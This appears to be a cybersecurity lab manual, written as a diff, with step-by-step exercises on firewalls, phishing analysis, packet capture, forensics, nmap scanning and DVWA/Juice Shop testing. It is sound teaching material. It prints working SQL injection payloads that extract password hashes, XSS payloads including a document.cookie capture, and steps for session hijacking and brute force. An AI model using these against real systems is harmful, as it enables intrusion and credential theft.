@@ -1,0 +1,1310 @@
+Experiment 1 — Basic Firewall Configuration
+Part A — Manual Firewall Configuration
+	1	Press Windows + R
+	2	Type:
+wf.msc
+	3	Press Enter.
+	4	Click Inbound Rules.
+	5	Click New Rule.
+	6	Select Custom.
+	7	Click Next.
+	8	Select All Programs.
+	9	Click Next.
+	10	Keep default protocol settings.
+	11	Click Next.
+	12	Under Remote IP address, select:
+These IP addresses
+	13	Click Add.
+	14	Enter:
+1.2.3.4
+	15	Click OK.
+	16	Click Next.
+	17	Select:
+Block the connection
+	18	Click Next.
+	19	Select all:
+	•	Domain
+	•	Private
+	•	Public
+	20	Click Next.
+	21	Enter rule name:
+Manual_Block_IP
+	22	Click Finish.
+	23	Open Inbound Rules.
+	24	Verify the rule Manual_Block_IP exists.
+
+Part B — Automated Firewall Configuration using Python
+	1	Open VS Code or Notepad.
+	2	Create file:
+firewall.py
+	3	Paste:
+import requests, csv, subprocess
+
+response = requests.get(
+    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text
+
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
+
+for row in mycsv:
+    ip = row[1]
+
+    if ip != "dst_ip":
+        print("Added Rule to block:", ip)
+
+        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+
+        subprocess.run(["PowerShell", "-Command", rule])
+	4	Save the file.
+	5	Open Command Prompt as Administrator.
+	6	Navigate to file location:
+cd Desktop
+	7	Check Python:
+python --version
+	8	Install requests module:
+python -m pip install requests
+	9	Run the script:
+python firewall.py
+	10	Wait for blocked IP messages.
+	11	Open:
+wf.msc
+	12	Go to:
+Outbound Rules
+	13	Verify rules named:
+BadIP
+
+
+Experiment 2 — Password Strength Testing using Python
+	1	Open VS Code or any Python IDE.
+	2	Create file:
+password_checker.py
+	3	Paste:
+import re
+
+def check_password_strength(password):
+
+    if len(password) < 8:
+        return "Weak: Password must be at least 8 characters long."
+
+    if not any(char.isdigit() for char in password):
+        return "Weak: Password must include at least one number."
+
+    if not any(char.isupper() for char in password):
+        return "Weak: Password must include at least one uppercase letter."
+
+    if not any(char.islower() for char in password):
+        return "Weak: Password must include at least one lowercase letter."
+
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special characters to make your password stronger."
+
+    return "Strong: Your password is secure!"
+
+
+def password_checker():
+
+    print("Welcome to the Password Strength Checker!")
+
+    while True:
+
+        password = input("\nEnter your password (or type 'exit' to quit): ")
+
+        if password.lower() == "exit":
+            print("Thank you for using the Password Strength Checker! Goodbye!")
+            break
+
+        result = check_password_strength(password)
+        print(result)
+
+
+if __name__ == "__main__":
+    password_checker()
+	4	Save the file.
+	5	Open Command Prompt or VS Code Terminal.
+	6	Navigate to file location:
+cd Desktop
+	7	Run the program:
+python password_checker.py
+	8	Enter weak password:
+abc123
+	9	Press Enter.
+	10	Observe weak password message.
+	11	Enter medium password:
+Abcdef12
+	12	Press Enter.
+	13	Observe medium password message.
+	14	Enter strong password:
+Abc@1234
+	15	Press Enter.
+	16	Observe strong password message.
+	17	Type:
+exit
+	18	Press Enter to stop the program.
+
+Experiment 3 — Analyzing Phishing Emails
+	1	Open browser.
+	2	Open EML Analyzer website.
+	3	Upload file:
+2020-05-05-phishing-email-example-01.eml
+	4	Wait for analysis results.
+	5	Note sender email address.
+	6	Note sender domain.
+	7	Note sender IP address.
+	8	Note SPF result.
+	9	Note DKIM result.
+	10	Note DMARC result.
+	11	Note suspicious URLs.
+	12	Open browser.
+	13	Open VirusTotal website.
+	14	Search IP:
+94.100.31.27
+	15	Press Enter.
+	16	Observe detection ratio.
+	17	Observe IP reputation.
+	18	Observe ASN information.
+	19	Observe location information.
+	20	Record:
+Sender Email: sues@nnwifi.com
+	21	Record:
+Domain: nnwifi.com
+	22	Record:
+Sender IP: 94.100.31.27
+	23	Record:
+SPF Result: Failed
+	24	Record suspicious URL:
+https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net
+	25	Conclude the email as phishing.
+Steps to Download the EML File
+	1	Open browser.
+	2	Open website: Malware Traffic Analysis
+	3	In the homepage, scroll down slowly.
+	4	Look for yearly analysis posts.
+	5	Find the section for:
+2020
+	6	Click the post dated:
+2020-05-05
+	7	The analysis page will open.
+	8	Scroll down on that page.
+	9	Find section:
+Email characteristics
+	10	Look for downloadable sample links.
+	11	Find file:
+2020-05-05-phishing-email-example-01.eml
+	12	Click the .eml file link.
+	13	Browser downloads the file automatically.
+
+If You Cannot Find the File
+Use direct URL:
+Direct EML File Download
+
+Verify Download
+	1	Open Downloads folder.
+	2	Confirm file exists:
+2020-05-05-phishing-email-example-01.eml
+	3	File extension must be:
+.eml
+
+
+Experiment 4 — Packet Sniffing and Network Traffic Analysis
+	1	Open Kali Linux.
+	2	Open Terminal.
+	3	Start HTTP server:
+python3 -m http.server 8080
+	4	Open new terminal window.
+	5	Start packet capture:
+sudo tcpdump -i any -w capture.pcap port 8080
+	6	Enter Kali password if asked.
+	7	Open Firefox browser.
+	8	Open:
+http://localhost:8080
+	9	Refresh the page multiple times.
+	10	Return to tcpdump terminal.
+	11	Stop capture using:
+Ctrl + C
+	12	Verify file created:
+capture.pcap
+	13	Open File Manager.
+	14	Open Home directory.
+	15	Locate:
+capture.pcap
+	16	Double-click:
+capture.pcap
+	17	Wireshark opens automatically.
+	18	In Wireshark filter bar type:
+http.request.method == "POST"
+	19	Press Enter.
+	20	Click any packet from packet list.
+	21	Expand:
+	•	Hypertext Transfer Protocol
+	•	Line-based text data
+	22	Observe:
+	•	URLs
+	•	Browser details
+	•	User-Agent
+	•	HTTP headers
+	•	Plain text data
+	23	Verify HTTP traffic is visible without encryption.
+
+
+Experiment 5 — SQL Injection Attack using DVWA
+	1	Open Kali Linux.
+	2	Open Terminal.
+	3	Start Apache service:
+sudo service apache2 start
+	4	Start MySQL service:
+sudo service mysql start
+	5	Open Firefox browser.
+	6	Open:
+http://127.0.0.1/dvwa
+	7	Login using:
+Username: admin
+Password: password
+	8	Click:
+Create / Reset Database
+	9	Open:
+DVWA Security
+	10	Set security level:
+Low
+	11	Click:
+Submit
+	12	Open:
+Vulnerabilities → SQL Injection
+
+Basic SQL Injection
+	13	In User ID field enter:
+1
+	14	Click:
+Submit
+	15	Observe normal user details.
+
+Authentication Bypass
+	16	Clear User ID field.
+	17	Enter:
+1' OR '1'='1
+	18	Click:
+Submit
+	19	Observe all user records displayed.
+
+Find Number of Columns
+	20	Clear input field.
+	21	Enter:
+1' ORDER BY 1-- -
+	22	Click Submit.
+	23	Repeat using:
+1' ORDER BY 2-- -
+	24	Repeat using:
+1' ORDER BY 3-- -
+	25	Continue increasing number until error appears.
+	26	Note last successful number.
+
+UNION SELECT Test
+	27	Clear input field.
+	28	Enter:
+1' UNION SELECT 1,2-- -
+	29	Click Submit.
+	30	Observe values displayed.
+
+Extract Database Name
+	31	Clear input field.
+	32	Enter:
+1' UNION SELECT database(),2-- -
+	33	Click Submit.
+	34	Observe database name.
+
+Extract Table Names
+	35	Clear input field.
+	36	Enter:
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+	37	Click Submit.
+	38	Observe table names.
+
+Extract Column Names
+	39	Clear input field.
+	40	Enter:
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+	41	Click Submit.
+	42	Observe column names.
+
+Extract Username and Password
+	43	Clear input field.
+	44	Enter:
+1' UNION SELECT user,password FROM users-- -
+	45	Click Submit.
+	46	Observe usernames and password hashes displayed.
+
+Experiment 6 — Finding & Exploiting XSS Vulnerabilities using DVWA
+	1	Open Kali Linux.
+	2	Open Terminal.
+	3	Start Apache service:
+sudo service apache2 start
+	4	Start MySQL service:
+sudo service mysql start
+	5	Open Firefox browser.
+	6	Open:
+http://localhost/dvwa
+	7	Login using:
+Username: admin
+Password: password
+	8	Open:
+DVWA Security
+	9	Set security level:
+Low
+	10	Click:
+Submit
+
+Reflected XSS
+	11	Open:
+DVWA → XSS (Reflected)
+	12	In input field enter:
+<script>alert('XSS')</script>
+	13	Click:
+Submit
+	14	Observe popup alert.
+
+Stored XSS
+	15	Open:
+DVWA → XSS (Stored)
+	16	In Name field enter:
+<h1>Hacked</h1>
+	17	In Message field enter:
+<script>alert('Stored XSS')</script>
+	18	Click:
+Sign Guestbook
+	19	Refresh the page.
+	20	Observe popup alert repeatedly.
+
+DOM Based XSS
+	21	Open:
+DVWA → XSS (DOM)
+	22	In browser URL bar append:
+#<script>alert('DOM XSS')</script>
+	23	Press Enter.
+	24	Observe popup alert.
+
+Cookie Capture Demo
+	25	Open:
+DVWA → XSS (Stored)
+	26	In Message field enter:
+<script>alert(document.cookie)</script>
+	27	Click:
+Sign Guestbook
+	28	Observe session cookie popup.
+
+Security Level Testing
+	29	Open:
+DVWA Security
+	30	Change security level to:
+Medium
+	31	Click Submit.
+	32	Repeat reflected XSS payload.
+	33	Observe filtering behavior.
+	34	Change security level to:
+High
+	35	Click Submit.
+	36	Repeat payload again.
+	37	Observe stronger filtering/blocking.
+
+Experiment 7 — Testing Authentication Weaknesses and Session Management
+	1	Open Kali Linux.
+	2	Open Terminal.
+	3	Start Apache service:
+sudo service apache2 start
+	4	Start MySQL service:
+sudo service mysql start
+	5	Open Firefox browser.
+	6	Open:
+http://127.0.0.1/dvwa
+	7	Login using:
+Username: admin
+Password: password
+	8	Open:
+DVWA Security
+	9	Set security level:
+Low
+	10	Click:
+Submit
+
+Weak Password Authentication
+	11	Open:
+DVWA → Vulnerabilities → Brute Force
+	12	Enter:
+Username: admin
+Password: password
+	13	Click:
+Login
+	14	Observe successful login.
+
+Manual Brute Force Attack
+	15	Enter:
+Username: admin
+Password: admin
+	16	Click Login.
+	17	Enter:
+Username: admin
+Password: 123456
+	18	Click Login.
+	19	Enter:
+Username: admin
+Password: password
+	20	Click Login.
+	21	Observe successful login without account lock.
+
+Session ID Analysis
+	22	Login to DVWA.
+	23	Right-click webpage.
+	24	Click:
+Inspect
+	25	Open:
+Storage
+	26	Open:
+Cookies
+	27	Select:
+http://127.0.0.1
+	28	Observe:
+PHPSESSID
+	29	Copy session ID value.
+
+Session Hijacking
+	30	Keep victim browser logged in.
+	31	Open private window:
+Ctrl + Shift + P
+	32	Open:
+http://127.0.0.1/dvwa
+	33	Do not login.
+	34	Right-click webpage.
+	35	Click:
+Inspect
+	36	Open:
+Storage → Cookies
+	37	Select:
+http://127.0.0.1
+	38	Find:
+PHPSESSID
+	39	Replace session ID with copied victim session ID.
+	40	Press Enter.
+	41	Refresh page using:
+F5
+	42	Observe admin access without login.
+
+Session Fixation
+	43	Open normal browser window.
+	44	Open:
+http://127.0.0.1/dvwa
+	45	Do not login.
+	46	Right-click webpage.
+	47	Click:
+Inspect
+	48	Open:
+Storage → Cookies
+	49	Select:
+http://127.0.0.1
+	50	Note:
+PHPSESSID
+	51	Login using:
+Username: admin
+Password: password
+	52	Click Login.
+	53	Open:
+Inspect → Storage → Cookies
+	54	Compare session ID before login and after login.
+	55	Observe whether session ID changed or remained same.
+
+
+Experiment 8 — Web Application Vulnerability Scanning using OWASP ZAP
+	1	Open Command Prompt.
+	2	Start Juice Shop using Docker:
+docker run --rm -p 3000:3000 bkimminich/juice-shop
+	3	Wait until application starts completely.
+	4	Open browser.
+	5	Open:
+http://localhost:3000
+	6	Verify Juice Shop application loads.
+
+Start OWASP ZAP
+	7	Open:
+OWASP ZAP
+	8	When prompted select:
+No, I do not want to persist this session
+	9	Click:
+Start
+
+Configure Browser Proxy
+	10	Open browser settings.
+	11	Open:
+Network Settings
+	12	Select:
+Manual proxy configuration
+	13	Set:
+HTTP Proxy: 127.0.0.1
+Port: 8080
+	14	Save settings.
+
+Verify Connection
+	15	Open browser.
+	16	Open:
+http://localhost:3000
+	17	Open OWASP ZAP.
+	18	Verify:
+http://localhost:3000
+appears in Sites panel.
+
+Spider Scan
+	19	Right-click:
+http://localhost:3000
+	20	Click:
+Attack → Spider
+	21	Click:
+Start Scan
+	22	Wait for spider scan completion.
+
+Active Scan
+	23	Right-click:
+http://localhost:3000
+	24	Click:
+Attack → Active Scan
+	25	Click:
+Start Scan
+	26	Wait for active scan completion.
+
+Analyze Vulnerabilities
+	27	Open:
+Alerts Tab
+	28	Observe vulnerabilities:
+	•	Cross Site Scripting
+	•	Missing Security Headers
+	•	Cookie Security Issues
+	•	Information Disclosure
+	29	Click any alert.
+	30	Observe:
+	•	Description
+	•	Risk Level
+	•	Evidence
+	•	Attack Payload
+	•	Suggested Remediation
+
+Export Report
+	31	Open:
+Report
+	32	Select report format:
+	•	HTML
+	•	PDF
+	•	XML
+	33	Select risk levels.
+	34	Select confidence levels.
+	35	Click:
+Generate Report
+	36	Save report file.
+
+
+Experiment 1 — Analying Android App Permissions and Mobile Traffic
+	1	Open Android Studio.
+	2	Open:
+AVD Manager
+	3	Click:
+Create Virtual Device
+	4	Select:
+Pixel 2
+or
+Pixel 9
+	5	Click:
+Next
+	6	Select Android image.
+	7	Click:
+Finish
+
+Start Emulator
+	8	Open Command Prompt.
+	9	Navigate:
+cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
+	10	List AVD devices:
+emulator -list-avds
+	11	Start emulator:
+emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
+
+Configure Proxy in Emulator
+	12	Open:
+Settings
+	13	Open:
+Network & Internet
+	14	Open:
+Internet
+	15	Select connected WiFi.
+	16	Click:
+Edit
+	17	Open:
+Advanced Options
+	18	Open:
+Proxy
+	19	Select:
+Manual
+	20	Set:
+Hostname: 10.0.2.2
+Port: 8080
+	21	Click:
+Save
+
+If Save Does Not Work
+	22	Open new Command Prompt.
+	23	Navigate:
+cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
+	24	Verify emulator:
+adb devices
+	25	Configure proxy:
+adb shell settings put global http_proxy 10.0.2.2:8080
+	26	Verify proxy:
+adb shell settings get global http_proxy
+
+Configure Burp Suite
+	27	Open:
+Burp Suite
+	28	Open:
+Proxy → Options
+	29	Under:
+Proxy Listeners
+click:
+Edit
+	30	Select:
+All Interfaces
+	31	Click:
+OK
+	32	Open:
+Proxy → Intercept
+	33	Click:
+Intercept is ON
+
+Capture HTTP Traffic
+	34	Open Chrome inside emulator.
+	35	Open:
+http://example.com
+	36	Open Burp Suite.
+	37	Open:
+HTTP History
+	38	Observe captured HTTP requests and responses.
+
+Export Burp Certificate
+	39	Open:
+Proxy → Options
+	40	Click:
+Import / Export CA Certificate
+	41	Select:
+Certificate in DER format
+	42	Save file as:
+burpcer.der
+
+Send Certificate to Emulator
+	43	Open Command Prompt.
+	44	Navigate:
+cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
+	45	Push certificate:
+adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
+
+Install Certificate in Emulator
+	46	Open emulator Settings.
+	47	Open:
+Security & Privacy
+	48	Open:
+More Security & Privacy
+	49	Open:
+Encryption & Credentials
+	50	Open:
+Install a Certificate
+	51	Select:
+CA Certificate
+	52	Select:
+burpcer.der
+	53	Confirm installation.
+
+Verify HTTPS Interception
+	54	Open Chrome inside emulator.
+	55	Open:
+https://example.com
+	56	Open Burp Suite.
+	57	Open:
+HTTP History
+	58	Observe HTTPS requests captured successfully.
+
+
+Experiment 2 — Creating and Analyzing Disk Images Using dc3dd and Autopsy
+	1	Open Kali Linux.
+	2	Open Terminal:
+Ctrl + Alt + T
+
+Create Sample Evidence
+	3	Create evidence file:
+echo "Cybersecurity Lab Evidence" > evidence.txt
+	4	Verify file:
+ls
+	5	View file content:
+cat evidence.txt
+
+Identify Disk Partition
+	6	List storage devices:
+lsblk
+	7	Note partition:
+/dev/sda1
+
+Install dc3dd
+	8	Install dc3dd:
+sudo apt install dc3dd -y
+	9	Verify installation:
+dc3dd --help
+
+Create Disk Image
+	10	Create practice disk:
+dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+	11	Format disk:
+mkfs.ext4 practice_disk.dd
+
+Create Forensic Image
+	12	Create disk image:
+sudo dc3dd if=/dev/sda1 of=/home/kali/disk_image.dd hash=md5 log=/home/kali/acquisition.log
+	13	Wait for imaging process completion.
+
+Verify Image
+	14	Verify image file:
+ls -lh /home/kali/disk_image.dd
+	15	View acquisition log:
+cat /home/kali/acquisition.log
+
+Start Autopsy
+	16	Launch Autopsy:
+autopsy
+	17	Observe URL:
+http://localhost:9999/autopsy
+	18	Open Firefox browser.
+	19	Open:
+http://localhost:9999/autopsy
+
+Create New Case
+	20	Click:
+Create New Case
+	21	Enter case name.
+	22	Enter description.
+	23	Click:
+Next
+	24	Enter host name:
+KaliLabMachine
+	25	Click:
+Next
+
+Add Disk Image
+	26	Click:
+Add Image
+	27	Browse:
+/home/kali/disk_image.dd
+	28	Select image file.
+	29	Click:
+Next
+	30	Click:
+Add
+	31	Wait for analysis completion.
+
+Analyze Evidence
+	32	Open:
+File Analysis
+	33	Browse files.
+	34	Locate:
+evidence.txt
+	35	Open file.
+	36	Verify content:
+Cybersecurity Lab Evidence
+
+
+Experiment 3 — Privacy Audit of Popular Apps and Websites
+	1	Open Kali Linux.
+	2	Open Terminal.
+
+Install Node.js and npm
+	3	Run:
+sudo apt update
+	4	Run:
+sudo apt install nodejs npm -y
+
+Install Nativefier
+	5	Run:
+sudo npm install -g nativefier
+
+Create WhatsApp Desktop Application
+	6	Run:
+nativefier https://web.whatsapp.com
+	7	Wait for application creation.
+	8	Verify folder:
+WhatsAppWeb-linux-x64
+
+Launch WhatsApp Desktop
+	9	Navigate:
+cd WhatsAppWeb-linux-x64
+	10	Run:
+./WhatsAppWeb
+	11	Scan QR code using mobile WhatsApp.
+	12	Login successfully.
+
+Analyze Trackers Using Exodus Privacy
+	13	Open Firefox browser.
+	14	Open: Exodus Privacy
+	15	Search:
+WhatsApp
+	16	Open WhatsApp report.
+	17	Observe:
+	•	Trackers
+	•	Permissions
+	18	Record:
+	•	Number of trackers
+	•	Permissions used
+
+Start Wireshark
+	19	Open Terminal.
+	20	Run:
+wireshark &
+	21	Select interface:
+eth0
+or
+wlan0
+	22	Click:
+Start Capture
+
+Generate WhatsApp Traffic
+	23	Open WhatsApp Desktop.
+	24	Send messages.
+	25	Send images.
+	26	Open chats.
+	27	Generate network activity.
+
+Analyze Traffic
+	28	Return to Wireshark.
+	29	Observe packets.
+	30	Apply filter:
+tcp
+	31	Observe TCP packets.
+	32	Apply filter:
+http
+	33	Observe HTTP traffic.
+	34	Apply filter:
+dns
+	35	Observe DNS requests.
+
+Analyze Facebook Website
+	36	Open Firefox browser.
+	37	Open: Facebook
+	38	Login if required.
+	39	Browse pages.
+	40	Generate traffic.
+	41	Return to Wireshark.
+	42	Observe Facebook network traffic.
+
+Stop Capture
+	43	Click:
+Stop Capture
+	44	Save capture file if required.
+
+
+Experiment 4 — Conducting Security Audit and Risk Assessment
+	1	Open Windows system.
+
+System Information
+	2	Press:
+Windows + R
+	3	Type:
+msinfo32
+	4	Press Enter.
+	5	Observe:
+	•	OS Version
+	•	System Type
+	•	Secure Boot State
+
+Check Windows Updates
+	6	Open:
+Settings
+	7	Open:
+Windows Update
+	8	Click:
+Check for updates
+	9	Observe update status.
+
+Check Firewall Status
+	10	Search:
+Windows Defender Firewall
+	11	Open:
+Windows Defender Firewall
+	12	Click:
+Turn Windows Defender Firewall on or off
+	13	Verify firewall status.
+
+Check Antivirus Status
+	14	Open:
+Windows Security
+	15	Open:
+Virus & Threat Protection
+	16	Verify:
+	•	Real-time protection ON
+	•	Recent scan available
+	•	No threats detected
+
+Check Password and Account Security
+	17	Open:
+Settings
+	18	Open:
+Accounts
+	19	Open:
+Sign-in options
+	20	Verify:
+	•	Password enabled
+	•	PIN enabled
+	•	Windows Hello enabled (optional)
+
+Check Installed Applications
+	21	Open:
+Settings
+	22	Open:
+Apps
+	23	Open:
+Installed apps
+	24	Check for:
+	•	Unknown software
+	•	Cracked tools
+	•	Suspicious applications
+
+Check Startup Programs
+	25	Press:
+Ctrl + Shift + Esc
+	26	Open:
+Startup
+	27	Review startup applications.
+	28	Disable unknown applications if present.
+
+Check Network Security
+	29	Open:
+Settings
+	30	Open:
+Network & Internet
+	31	Verify:
+	•	Connected WiFi
+	•	Network type
+	•	Private/Public status
+
+Check Running Processes
+	32	Open:
+Task Manager
+	33	Open:
+Processes
+	34	Check for:
+	•	High CPU usage
+	•	Unknown applications
+	•	Suspicious background processes
+
+Browser Security Check
+	35	Open Chrome or Edge browser.
+	36	Open:
+Settings
+	37	Open:
+Privacy and Security
+	38	Verify:
+	•	Safe Browsing enabled
+	•	HTTPS enabled
+	•	Pop-up blocking enabled
+
+Command Prompt Security Check
+	39	Open Command Prompt.
+	40	Run:
+netstat -ano
+	41	Observe:
+	•	Active connections
+	•	Listening ports
+	•	Suspicious connections
+
+Final Risk Assessment
+	42	Record:
+	•	Vulnerabilities found
+	•	Weak configurations
+	•	Security recommendations
+	•	Mitigation strategies
+
+
+Experiment 5 — Network Forensics Using Wireshark
+	1	Open Kali Linux.
+	2	Open Terminal.
+	3	Run:
+wireshark
+	4	Select interface:
+eth0
+or
+wlan0
+	5	Click:
+Start
+
+TCP Protocol Analysis
+	6	In filter bar type:
+tcp
+	7	Press Enter.
+	8	Observe TCP packets.
+
+UDP Protocol Analysis
+	9	Clear filter.
+	10	Type:
+udp
+	11	Press Enter.
+	12	Observe UDP packets.
+
+HTTP Protocol Analysis
+	13	Clear filter.
+	14	Type:
+http
+	15	Press Enter.
+	16	Observe HTTP packets.
+
+Filter Specific IP Address
+	17	Clear filter.
+	18	Type:
+ip.addr == 192.168.0.161
+	19	Press Enter.
+	20	Observe packets for that IP.
+
+Filter Source IP
+	21	Clear filter.
+	22	Type:
+ip.src == 192.168.0.161
+	23	Press Enter.
+	24	Observe source packets.
+
+Follow TCP Stream
+	25	Right-click any TCP packet.
+	26	Click:
+Follow
+	27	Click:
+TCP Stream
+	28	Observe complete communication stream.
+
+Detect Suspicious Traffic
+	29	Open new terminal.
+	30	Run:
+nmap -sS 192.168.0.156
+	31	Return to Wireshark.
+	32	Apply filter:
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+	33	Press Enter.
+	34	Observe SYN scan packets.
+
+Capture File Properties
+	35	Open:
+Statistics
+	36	Click:
+Capture File Properties
+	37	Observe:
+	•	Packet count
+	•	Protocols
+	•	Capture duration
+
+Resolved Addresses
+	38	Open:
+Statistics
+	39	Click:
+Resolved Addresses
+	40	Observe resolved IP and MAC addresses.
+
+Protocol Hierarchy
+	41	Open:
+Statistics
+	42	Click:
+Protocol Hierarchy
+	43	Observe protocol statistics.
+
+Conversations
+	44	Open:
+Statistics
+	45	Click:
+Conversations
+	46	Observe endpoint communications.
+
+Stop Capture
+	47	Click:
+Stop Capture
+	48	Save capture file if required.
+
+
+Experiment 6 — Log File Analysis for Incident Detection
+	1	Open Kali Linux.
+	2	Open Terminal.
+
+Navigate to Log Directory
+	3	Run:
+cd /var/log
+	4	List log files:
+ls
+
+Successful Login Analysis
+	5	Run:
+last
+	6	Observe login history.
+
+System Log Analysis
+	7	Run:
+journalctl | less
+	8	Observe system logs.
+	9	Press:
+q
+to exit.
+
+Failed Login Attempts
+	10	Run:
+journalctl | grep "Failed"
+	11	Observe failed authentication attempts.
+
+SSH Login Activity
+	12	Run:
+journalctl | grep ssh
+	13	Observe SSH-related logs.
+
+Error Detection
+	14	Run:
+journalctl | grep -i error
+	15	Observe system errors.
+
+Apache Log Analysis
+	16	Navigate:
+cd /var/log/apache2
+	17	List files:
+ls
+	18	Open access log:
+sudo less access.log
+	19	Observe web requests.
+	20	Press:
+q
+to exit.
+
+Detect Suspicious Requests
+	21	Run:
+grep "404" /var/log/apache2/access.log
+	22	Observe failed requests.
+
+Package Activity Analysis
+	23	Run:
+less /var/log/dpkg.log
+	24	Observe installation and update logs.
+	25	Press:
+q
+to exit.
+
+Real-Time Monitoring
+	26	Run:
+sudo journalctl -f
+	27	Observe real-time logs.
+	28	Press:
+Ctrl + C
+to stop monitoring.
+
+Install SSH Server
+	29	Run:
+sudo apt install openssh-server -y
+	30	Start SSH service:
+sudo service ssh start
+
+Find IP Address
+	31	Run:
+ip a
+	32	Note system IP address.
+
+Simulate Failed SSH Login
+	33	Open another terminal or another machine.
+	34	Run:
+ssh fakeuser@<IP_ADDRESS>
+	35	Enter wrong password multiple times.
+	36	Return to original terminal.
+	37	Run:
+journalctl | grep ssh
+	38	Observe failed SSH login attempts in logs.
+
+
+Experiment 7 — Testing IoT Device Security (Default Passwords & Open Ports)
+	1	Open Windows system.
+	2	Open Command Prompt.
+
+Deploy Juice Shop
+	3	Run:
+docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+	4	Wait for container startup.
+
+Access IoT Dashboard
+	5	Open browser.
+	6	Open:
+http://localhost:8090
+	7	Verify Juice Shop dashboard loads.
+
+Find Host IP Address
+	8	Open Command Prompt.
+	9	Run:
+ipconfig
+	10	Note IPv4 address.
+
+Start Kali Linux
+	11	Open Kali Linux.
+	12	Open Terminal.
+
+Perform Nmap Scan
+	13	Run:
+nmap -sV <WINDOWS_IP_ADDRESS>
+Example:
+nmap -sV 192.168.0.148
+	14	Observe:
+	•	Open ports
+	•	Running services
+	•	Service versions
+	•	Banner information
+
+Perform Service Enumeration
+	15	Run:
+nmap -A <WINDOWS_IP_ADDRESS>
+	16	Observe:
+	•	OS detection
+	•	MAC address
+	•	Service fingerprints
+	•	Additional enumeration details
+
+Access IoT Web Interface
+	17	Open browser in Kali Linux.
+	18	Open:
+http://<WINDOWS_IP_ADDRESS>:8090
+Example:
+http://192.168.0.148:8090
+	19	Verify dashboard access.
+
+Test Weak Credentials
+	20	Open login page.
+	21	Enter administrator credentials.
+	22	Attempt login using weak/default password combinations.
+	23	Observe successful or failed login.
+
+Analyze HTTP Traffic
+	24	Open browser Developer Tools:
+F12
+	25	Open:
+Network
+	26	Refresh webpage.
+	27	Observe:
+	•	HTTP requests
+	•	Plain text traffic
+	•	Unencrypted communication
+
+Verify Open Ports
+	28	Observe open ports from Nmap scan:
+	•	8090
+	•	135
+	•	139
+	•	445
+	29	Record detected services.
+
+Stop Docker Container
+	30	Open Command Prompt.
+	31	Run:
+docker stop juiceshop
+	32	Remove container:
+docker rm juiceshop
+
+
+
+
+
